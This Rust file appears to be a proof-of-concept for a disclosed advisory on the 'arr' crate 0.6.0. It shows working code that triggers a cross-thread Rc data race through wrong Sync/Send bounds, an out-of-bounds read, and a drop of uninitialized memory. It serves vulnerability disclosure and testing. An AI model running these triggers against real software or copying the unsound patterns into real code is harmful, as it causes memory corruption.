/*!
```crux-poc
[target]
crate = "arr"
version = "0.6.0"

[[target.peer]]
crate = "crossbeam-utils"
version = "0.7.2"

[test]
analyzers = ["manual", "UnsafeDestructor"]
cargo_flags = ["--release"]
cargo_toolchain = "nightly"

[report]
title = "Multiple security issues including data race, buffer overflow, and uninitialized memory drop"
description = """
`arr` crate contains multiple security issues. Specifically,

1. It incorrectly implements Sync/Send bounds, which allows to smuggle non-Sync/Send types across the thread boundary.
2. `Index` and `IndexMut` implementation does not check the array bound.
3. `Array::new_from_template()` drops uninitialized memory."""
code_snippets = []
patched = []
issue_url = "https://github.com/sjep/array/issues/1"
issue_date = 2020-08-25
rustsec_url = "https://github.com/RustSec/advisory-db/pull/364"
```
!*/
#![forbid(unsafe_code)]

use arr::Array;
use crossbeam_utils::thread;
use std::rc::Rc;
use std::sync::atomic::{AtomicUsize, Ordering};

static drop_cnt: AtomicUsize = AtomicUsize::new(0);

#[derive(Clone)]
struct DropDetector(u32);

impl Drop for DropDetector {
    fn drop(&mut self) {
        drop_cnt.fetch_add(1, Ordering::Relaxed);
        println!("Dropping {}", self.0);
    }
}

fn main() {
    {
        // https://github.com/sjep/array/blob/efa214159eaad2abda7b072f278d678f8788c307/src/lib.rs#L46-L47
        // 1. Incorrect Sync/Send bounds for `Array` allows to smuggle non-Sync/Send types across the thread boundary
        let rc = Rc::new(0usize);
        let arr = Array::new_from_template(1, &rc);
        let arr_handle = &arr;

        let rc_identity1 = Rc::as_ptr(&rc) as usize;
        let rc_identity2 = thread::scope(|s| {
            s.spawn(|_| {
                // shouldn't be allowed!
                println!("1. Cloning Rc in a different thread");
                let another_rc: Rc<usize> = arr_handle[0].clone();
                Rc::as_ptr(&another_rc) as usize
            })
            .join()
            .unwrap()
        })
        .unwrap();

        assert_eq!(rc_identity1, rc_identity2);
    }
    {
        // https://github.com/sjep/array/blob/efa214159eaad2abda7b072f278d678f8788c307/src/lib.rs#L129-L148
        // 2. `Index` and `IndexMut` does not check the bound
        let arr = Array::<usize>::zero(1);
        println!("2. OOB read: {}", arr[10]);
    }
    {
        // https://github.com/sjep/array/blob/efa214159eaad2abda7b072f278d678f8788c307/src/lib.rs#L111-L127
        // https://github.com/sjep/array/blob/efa214159eaad2abda7b072f278d678f8788c307/src/lib.rs#L165-L174
        // 3. `Array::new_from_template()` drops uninitialized memory because of `*ptr = value` pattern.
        // It also leaks memory since it doesn't call `drop_in_place()` in `drop()`.
        println!("3. Uninitialized drop / memory leak in `new_from_template()`");
        let _ = Array::new_from_template(1, &DropDetector(12345));
    }
}
